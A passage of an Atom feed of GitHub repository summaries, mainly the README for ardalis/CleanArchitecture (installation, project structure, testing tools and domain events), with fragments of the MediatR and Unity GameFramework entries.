variance.&lt;/p&gt; &#xA;&lt;p&gt;Examples in the &lt;a href=&#34;https://github.com/jbogard/MediatR/wiki&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Installing MediatR&lt;/h3&gt; &#xA;&lt;p&gt;You should install &lt;a href=&#34;https://www.nuget.org/packages/MediatR&#34;&gt;MediatR with NuGet&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Install-Package MediatR&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or via the .NET Core command line interface:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dotnet add package MediatR&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Either commands, from Package Manager Console or .NET Core CLI, will download and install MediatR and all required dependencies.&lt;/p&gt; &#xA;&lt;h3&gt;Using Contracts-Only Package&lt;/h3&gt; &#xA;&lt;p&gt;To reference only the contracts for MediatR, which includes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;IRequest&lt;/code&gt; (including generic variants and &lt;code&gt;Unit&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;INotification&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;IStreamRequest&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Add a package reference to &lt;a href=&#34;https://www.nuget.org/packages/MediatR.Contracts&#34;&gt;MediatR.Contracts&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This package is useful in scenarios where your MediatR contracts are in a separate assembly/project from handlers. Example scenarios include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;API contracts&lt;/li&gt; &#xA; &lt;li&gt;GRPC contracts&lt;/li&gt; &#xA; &lt;li&gt;Blazor&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>ardalis/CleanArchitecture</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/ardalis/CleanArchitecture</id>
    <link href="https://github.com/ardalis/CleanArchitecture" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Clean Architecture Solution Template: A starting point for Clean Architecture with ASP.NET Core&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/actions&#34;&gt;&lt;img src=&#34;https://github.com/ardalis/CleanArchitecture/workflows/.NET%20Core/badge.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/actions/workflows/publish.yml&#34;&gt;&lt;img src=&#34;https://github.com/ardalis/CleanArchitecture/actions/workflows/publish.yml/badge.svg?sanitize=true&#34; alt=&#34;publish Ardalis.CleanArchitecture Template to nuget&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Ardalis.CleanArchitecture.Template/&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Ardalis.CleanArchitecture.Template?label=Ardalis.CleanArchitecture.Template&#34; alt=&#34;Ardalis.CleanArchitecture.Template on NuGet&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=ardalis&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/ardalis.svg?label=Follow%20@ardalis&#34; alt=&#34;Follow @ardalis&#34;&gt; &lt;/a&gt; &amp;nbsp; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=nimblepros&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/nimblepros.svg?label=Follow%20@nimblepros&#34; alt=&#34;Follow @nimblepros&#34;&gt; &lt;/a&gt; &#xA;&lt;h1&gt;Clean Architecture&lt;/h1&gt; &#xA;&lt;p&gt;A starting point for Clean Architecture with ASP.NET Core. &lt;a href=&#34;https://8thlight.com/blog/uncle-bob/2012/08/13/the-clean-architecture.html&#34;&gt;Clean Architecture&lt;/a&gt; is just the latest in a series of names for the same loosely-coupled, dependency-inverted architecture. You will also find it named &lt;a href=&#34;http://alistair.cockburn.us/Hexagonal+architecture&#34;&gt;hexagonal&lt;/a&gt;, &lt;a href=&#34;http://www.dossier-andreas.net/software_architecture/ports_and_adapters.html&#34;&gt;ports-and-adapters&lt;/a&gt;, or &lt;a href=&#34;http://jeffreypalermo.com/blog/the-onion-architecture-part-1/&#34;&gt;onion architecture&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This architecture is used in the &lt;a href=&#34;https://www.pluralsight.com/courses/fundamentals-domain-driven-design&#34;&gt;DDD Fundamentals course&lt;/a&gt; by &lt;a href=&#34;https://ardalis.com&#34;&gt;Steve Smith&lt;/a&gt; and &lt;a href=&#34;https://thedatafarm.com/&#34;&gt;Julie Lerman&lt;/a&gt;. Contact Steve&#39;s company, &lt;a href=&#34;https://nimblepros.com/&#34;&gt;NimblePros&lt;/a&gt;, for Clean Architecture or DDD training and/or implementation assistance for your team.&lt;/p&gt; &#xA;&lt;h2&gt;Table Of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#clean-architecture&#34;&gt;Clean Architecture&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#table-of-contents&#34;&gt;Table Of Contents&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#give-a-star-star&#34;&gt;Give a Star! &lt;span&gt;⭐&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=GregTrevellick.CleanArchitecture&#34;&gt;Now available as a project template&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#versions&#34;&gt;Versions&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#learn-more&#34;&gt;Learn More&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#getting-started&#34;&gt;Getting Started&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#using-the-visual-studio-item-template&#34;&gt;Using the Visual Studio Item Template&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#using-the-dotnet-cli-template&#34;&gt;Using the dotnet CLI template&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#using-the-github-repository&#34;&gt;Using the GitHub Repository&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#running-migrations&#34;&gt;Running Migrations&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#goals&#34;&gt;Goals&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#history-and-shameless-plug-section&#34;&gt;History and Shameless Plug Section&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#design-decisions-and-dependencies&#34;&gt;Design Decisions and Dependencies&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#the-core-project&#34;&gt;The Core Project&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#the-sharedkernel-project&#34;&gt;The SharedKernel Project&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#the-infrastructure-project&#34;&gt;The Infrastructure Project&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#the-web-project&#34;&gt;The Web Project&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#the-test-projects&#34;&gt;The Test Projects&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#patterns-used&#34;&gt;Patterns Used&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#domain-events&#34;&gt;Domain Events&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ardalis/CleanArchitecture/main/#related-projects&#34;&gt;Related Projects&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Give a Star! &lt;span&gt;⭐&lt;/span&gt;&lt;/h2&gt; &#xA;&lt;p&gt;If you like or are using this project to learn or start your solution, please give it a star. Thanks!&lt;/p&gt; &#xA;&lt;p&gt;Or if you&#39;re feeling really generous, we now support GitHub sponsorships - see the button above.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;em&gt;Now available as a &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=GregTrevellick.CleanArchitecture&#34;&gt;project template&lt;/a&gt; within Visual Studio.&lt;/em&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;Versions&lt;/h2&gt; &#xA;&lt;p&gt;The master branch is now using .NET 6. If you need a previous version use one of these tagged commits:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/releases/tag/dotnet-core-5&#34;&gt;5.0&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/tree/dotnet-core-3.1&#34;&gt;3.1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/tree/dotnet-core-2.2&#34;&gt;2.2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/tree/dotnet-core-2.0&#34;&gt;2.0&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Learn More&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/c/Ardalis/search?query=clean%20architecture&#34;&gt;Live Stream Recordings Working on Clean Architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://player.fm/series/net-rocks/clean-architecture-with-steve-smith&#34;&gt;DotNetRocks Podcast Discussion with Steve &#34;ardalis&#34; Smith&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=k8cZUW4MS3I&#34;&gt;Fritz and Friends Streaming Discussion with Steve &#34;ardalis&#34; Smith&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Getting Started&lt;/h1&gt; &#xA;&lt;p&gt;To use this template, there are a few options:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install using &lt;code&gt;dotnet new&lt;/code&gt; (preferred - see below)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=GregTrevellick.CleanArchitecture&#34;&gt;Install the Visual Studio Template&lt;/a&gt; and use it within Visual Studio&lt;/li&gt; &#xA; &lt;li&gt;Download this Repository&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;These are all covered below.&lt;/p&gt; &#xA;&lt;h2&gt;Using the Visual Studio Item Template&lt;/h2&gt; &#xA;&lt;p&gt;After installing the template, you should be able to create a new project in Visual Studio and search for Clean Architecture. You should see the template appear in your list of project templates:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/782127/80412393-cd116880-889b-11ea-886f-9b91fffbc767.png&#34; alt=&#34;Clean Architecture Project Template&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;After choosing this template, provide a project name and finish the project creation wizard. You should be all set.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/782127/80412455-e5818300-889b-11ea-8219-379581583a92.png&#34; alt=&#34;Clean Architecture Project Template step 2&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Note that the template is generally only updated with major updates to the project. The GitHub repository will always have the latest bug fixes and enhancements.&lt;/p&gt; &#xA;&lt;h2&gt;Using the dotnet CLI template&lt;/h2&gt; &#xA;&lt;p&gt;First, install the template from &lt;a href=&#34;https://www.nuget.org/packages/Ardalis.CleanArchitecture.Template/&#34;&gt;NuGet (https://www.nuget.org/packages/Ardalis.CleanArchitecture.Template/)&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;dotnet new -i Ardalis.CleanArchitecture.Template&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should see the template in the list of templates from &lt;code&gt;dotnet new&lt;/code&gt; after this install successfully. Look for &#34;Steve Smith Clean Architecture&#34; with Short Name of &#34;clean-arch&#34;.&lt;/p&gt; &#xA;&lt;p&gt;Navigate to the directory where you will put the new solution.&lt;/p&gt; &#xA;&lt;p&gt;Run this command to create the solution structure in a subfolder name &lt;code&gt;Your.ProjectName&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dotnet new clean-arch -o Your.ProjectName&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;Your.ProjectName&lt;/code&gt; directory and solution file will be created, and inside that will be all of your new solution contents, properly namespaced and ready to run/test!&lt;/p&gt; &#xA;&lt;p&gt;Example: &lt;img src=&#34;https://user-images.githubusercontent.com/782127/101661723-9fd28e80-3a16-11eb-8be4-f9195d825ad6.png&#34; alt=&#34;powershell screenshot showing steps&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Thanks &lt;a href=&#34;https://github.com/dahlsailrunner&#34;&gt;@dahlsailrunner&lt;/a&gt; for your help getting this working!&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Known Issue&lt;/strong&gt;: Don&#39;t include hyphens in the name. See &lt;a href=&#34;https://github.com/ardalis/CleanArchitecture/issues/201&#34;&gt;#201&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Using the GitHub Repository&lt;/h2&gt; &#xA;&lt;p&gt;To get started based on this repository, you need to get a copy locally. You have three options: fork, clone, or download. Most of the time, you probably just want to download.&lt;/p&gt; &#xA;&lt;p&gt;You should &lt;strong&gt;download the repository&lt;/strong&gt;, unblock the zip file, and extract it to a new folder if you just want to play with the project or you wish to use it as the starting point for an application.&lt;/p&gt; &#xA;&lt;p&gt;You should &lt;strong&gt;fork this repository&lt;/strong&gt; only if you plan on submitting a pull request. Or if you&#39;d like to keep a copy of a snapshot of the repository in your own GitHub account.&lt;/p&gt; &#xA;&lt;p&gt;You should &lt;strong&gt;clone this repository&lt;/strong&gt; if you&#39;re one of the contributors and you have commit access to it. Otherwise you probably want one of the other options.&lt;/p&gt; &#xA;&lt;h2&gt;Running Migrations&lt;/h2&gt; &#xA;&lt;p&gt;In Visual Studio, open the Package Manager Console, and run &lt;code&gt;Add-Migration InitialMigrationName -StartupProject Your.ProjectName.Web -Context AppDbContext -Project Your.ProjectName.Infrastructure&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To use SqlServer, change &lt;code&gt;options.UseSqlite(connectionString));&lt;/code&gt; to &lt;code&gt;options.UseSqlServer(connectionString));&lt;/code&gt; in the &lt;code&gt;Your.ProjectName.Infrastructure.StartupSetup&lt;/code&gt; file. Also remember to replace the &lt;code&gt;SqliteConnection&lt;/code&gt; with &lt;code&gt;DefaultConnection&lt;/code&gt; in the &lt;code&gt;Your.ProjectName.Web.Program&lt;/code&gt; file, which points to your Database Server.&lt;/p&gt; &#xA;&lt;h1&gt;Goals&lt;/h1&gt; &#xA;&lt;p&gt;The goal of this repository is to provide a basic solution structure that can be used to build Domain-Driven Design (DDD)-based or simply well-factored, SOLID applications using .NET Core. Learn more about these topics here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/csharp-solid-principles&#34;&gt;SOLID Principles for C# Developers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/principles-oo-design&#34;&gt;SOLID Principles of Object Oriented Design&lt;/a&gt; (the original, longer course)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/domain-driven-design-fundamentals&#34;&gt;Domain-Driven Design Fundamentals&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you&#39;re used to building applications as single-project or as a set of projects that follow the traditional UI -&amp;gt; Business Layer -&amp;gt; Data Access Layer &#34;N-Tier&#34; architecture, I recommend you check out these two courses (ideally before DDD Fundamentals):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/n-tier-apps-part1&#34;&gt;Creating N-Tier Applications in C#, Part 1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/n-tier-csharp-part2&#34;&gt;Creating N-Tier Applications in C#, Part 2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;I also maintain Microsoft&#39;s reference application, eShopOnWeb, and its associated free eBook. Check them out here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnWeb&#34;&gt;eShopOnWeb on GitHub&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://aka.ms/webappebook&#34;&gt;Architecting Modern Web Applications with ASP.NET Core and Microsoft Azure&lt;/a&gt; (eBook)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;History and Shameless Plug Section&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;ve used this starter kit to teach the basics of ASP.NET Core using Domain-Driven Design concepts and patterns for some time now (starting when ASP.NET Core was still in pre-release). Typically I teach a one- or two-day hands-on workshop ahead of events like DevIntersection, or private on-site workshops for companies looking to bring their teams up to speed with the latest development technologies and techniques. Feel free to &lt;a href=&#34;https://ardalis.com/contact-us&#34;&gt;contact me&lt;/a&gt; if you&#39;d like information about upcoming workshops.&lt;/p&gt; &#xA;&lt;h1&gt;Design Decisions and Dependencies&lt;/h1&gt; &#xA;&lt;p&gt;The goal of this sample is to provide a fairly bare-bones starter kit for new projects. It does not include every possible framework, tool, or feature that a particular enterprise application might benefit from. Its choices of technology for things like data access are rooted in what is the most common, accessible technology for most business software developers using Microsoft&#39;s technology stack. It doesn&#39;t (currently) include extensive support for things like logging, monitoring, or analytics, though these can all be added easily. Below is a list of the technology dependencies it includes, and why they were chosen. Most of these can easily be swapped out for your technology of choice, since the nature of this architecture is to support modularity and encapsulation.&lt;/p&gt; &#xA;&lt;h2&gt;The Core Project&lt;/h2&gt; &#xA;&lt;p&gt;The Core project is the center of the Clean Architecture design, and all other project dependencies should point toward it. As such, it has very few external dependencies. The one exception in this case is the &lt;code&gt;System.Reflection.TypeExtensions&lt;/code&gt; package, which is used by &lt;code&gt;ValueObject&lt;/code&gt; to help implement its &lt;code&gt;IEquatable&amp;lt;&amp;gt;&lt;/code&gt; interface. The Core project should include things like:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Entities&lt;/li&gt; &#xA; &lt;li&gt;Aggregates&lt;/li&gt; &#xA; &lt;li&gt;Domain Events&lt;/li&gt; &#xA; &lt;li&gt;DTOs&lt;/li&gt; &#xA; &lt;li&gt;Interfaces&lt;/li&gt; &#xA; &lt;li&gt;Event Handlers&lt;/li&gt; &#xA; &lt;li&gt;Domain Services&lt;/li&gt; &#xA; &lt;li&gt;Specifications&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;The SharedKernel Project&lt;/h2&gt; &#xA;&lt;p&gt;Many solutions will also reference a separate &lt;strong&gt;Shared Kernel&lt;/strong&gt; project/package. I recommend creating a separate SharedKernel project and solution if you will require sharing code between multiple &lt;a href=&#34;https://ardalis.com/encapsulation-boundaries-large-and-small/&#34;&gt;bounded contexts&lt;/a&gt; (see &lt;a href=&#34;https://www.pluralsight.com/courses/domain-driven-design-fundamentals&#34;&gt;DDD Fundamentals&lt;/a&gt;). I further recommend this be published as a NuGet package (most likely privately within your organization) and referenced as a NuGet dependency by those projects that require it. For this sample, in the interest of simplicity, I&#39;ve added a SharedKernel project to the solution. It contains types that would likely be shared between multiple bounded contexts (VS solutions, typically), in my experience. If you want to see an &lt;a href=&#34;https://www.nuget.org/packages/PluralsightDdd.SharedKernel/&#34;&gt;example of a SharedKernel package, the one I use in my updated Pluralsight DDD course is on NuGet here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;The Infrastructure Project&lt;/h2&gt; &#xA;&lt;p&gt;Most of your application&#39;s dependencies on external resources should be implemented in classes defined in the Infrastructure project. These classes should implement interfaces defined in Core. If you have a very large project with many dependencies, it may make sense to have multiple Infrastructure projects (e.g. Infrastructure.Data), but for most projects one Infrastructure project with folders works fine. The sample includes data access and domain event implementations, but you would also add things like email providers, file access, web api clients, etc. to this project so they&#39;re not adding coupling to your Core or UI projects.&lt;/p&gt; &#xA;&lt;p&gt;The Infrastructure project depends on &lt;code&gt;Microsoft.EntityFrameworkCore.SqlServer&lt;/code&gt; and &lt;code&gt;Autofac&lt;/code&gt;. The former is used because it&#39;s built into the default ASP.NET Core templates and is the least common denominator of data access. If desired, it can easily be replaced with a lighter-weight ORM like Dapper. Autofac (formerly StructureMap) is used to allow wireup of dependencies to take place closest to where the implementations reside. In this case, an InfrastructureRegistry class can be used in the Infrastructure class to allow wireup of dependencies there, without the entry point of the application even having to have a reference to the project or its types. &lt;a href=&#34;https://ardalis.com/avoid-referencing-infrastructure-in-visual-studio-solutions&#34;&gt;Learn more about this technique&lt;/a&gt;. The current implementation doesn&#39;t include this behavior - it&#39;s something I typically cover and have students add themselves in my workshops.&lt;/p&gt; &#xA;&lt;h2&gt;The Web Project&lt;/h2&gt; &#xA;&lt;p&gt;The entry point of the application is the ASP.NET Core web project. This is actually a console application, with a &lt;code&gt;public static void Main&lt;/code&gt; method in &lt;code&gt;Program.cs&lt;/code&gt;. It currently uses the default MVC organization (Controllers and Views folders) as well as most of the default ASP.NET Core project template code. This includes its configuration system, which uses the default &lt;code&gt;appsettings.json&lt;/code&gt; file plus environment variables, and is configured in &lt;code&gt;Startup.cs&lt;/code&gt;. The project delegates to the &lt;code&gt;Infrastructure&lt;/code&gt; project to wire up its services using Autofac.&lt;/p&gt; &#xA;&lt;h2&gt;The Test Projects&lt;/h2&gt; &#xA;&lt;p&gt;Test projects could be organized based on the kind of test (unit, functional, integration, performance, etc.) or by the project they are testing (Core, Infrastructure, Web), or both. For this simple starter kit, the test projects are organized based on the kind of test, with unit, functional and integration test projects existing in this solution. In terms of dependencies, there are three worth noting:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/xunit&#34;&gt;xunit&lt;/a&gt; I&#39;m using xunit because that&#39;s what ASP.NET Core uses internally to test the product. It works great and as new versions of ASP.NET Core ship, I&#39;m confident it will continue to work well with it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/Moq/&#34;&gt;Moq&lt;/a&gt; I&#39;m using Moq as a mocking framework for white box behavior-based tests. If I have a method that, under certain circumstances, should perform an action that isn&#39;t evident from the object&#39;s observable state, mocks provide a way to test that. I could also use my own Fake implementation, but that requires a lot more typing and files. Moq is great once you get the hang of it, and assuming you don&#39;t have to mock the world (which we don&#39;t in this case because of good, modular design).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/Microsoft.AspNetCore.TestHost&#34;&gt;Microsoft.AspNetCore.TestHost&lt;/a&gt; I&#39;m using TestHost to test my web project using its full stack, not just unit testing action methods. Using TestHost, you make actual HttpClient requests without going over the wire (so no firewall or port configuration issues). Tests run in memory and are very fast, and requests exercise the full MVC stack, including routing, model binding, model validation, filters, etc.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Patterns Used&lt;/h1&gt; &#xA;&lt;p&gt;This solution template has code built in to support a few common patterns, especially Domain-Driven Design patterns. Here is a brief overview of how a few of them work.&lt;/p&gt; &#xA;&lt;h2&gt;Domain Events&lt;/h2&gt; &#xA;&lt;p&gt;Domain events are a great pattern for decoupling a trigger for an operation from its implementation. This is especially useful from within domain entities since the handlers of the events can have dependencies while the entities themselves typically do not. In the sample, you can see this in action with the &lt;code&gt;ToDoItem.MarkComplete()&lt;/code&gt; method. The following sequence diagram demonstrates how the event and its handler are used when an item is marked complete through a web API endpoint.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/782127/75702680-216ce300-5c73-11ea-9187-ec656192ad3b.png&#34; alt=&#34;Domain Event Sequence Diagram&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Related Projects&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/apiendpoints&#34;&gt;ApiEndpoints&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/guardclauses&#34;&gt;GuardClauses&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/result&#34;&gt;Result&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ardalis/specification&#34;&gt;Specification&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>EllanJiang/GameFramework</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/EllanJiang/GameFramework</id>
    <link href="https://github.com/EllanJiang/GameFramework" rel="alternate"></link>
    <summary type="html">&lt;p&gt;This is literally a game framework, based on Unity game engine. It encapsulates commonly used game modules during development, and, to a large degree, standardises the process, enhances the development speed and ensures the product quality.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;HOMEPAGE&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;English&lt;/strong&gt; - Coming soon.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;简体中文&lt;/strong&gt; - &lt;a href=&#34;https://gameframework.cn/&#34;&gt;https://gameframework.cn/&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;QQ 讨论群&lt;/strong&gt; 216332935&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://gameframework.cn/image/gameframework.png&#34; alt=&#34;Game Framework&#34;&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Game Framework 简介&lt;/h2&gt; &#xA;&lt;p&gt;Game Framework 是一个基于 Unity 引擎的游戏框架，主要对游戏开发过程中常用模块进行了封装，很大程度地规范开发过程、加快开发速度并保证产品质量。&lt;/p&gt; &#xA;&lt;p&gt;在最新的 Game Framework 版本中，包含以下 19 个内置模块，后续我们还将开发更多的扩展模块供开发者使用。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;全局配置 (Config)&lt;/strong&gt; - 存储一些全局的只读的游戏配置，如玩家初始速度、游戏初始音量等。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;数据结点 (Data Node)&lt;/strong&gt; - 将任意类型的数据以树状结构的形式进行保存，用于管理游戏运行时的各种数据。&lt;/p&gt; &lt;/li&gt; 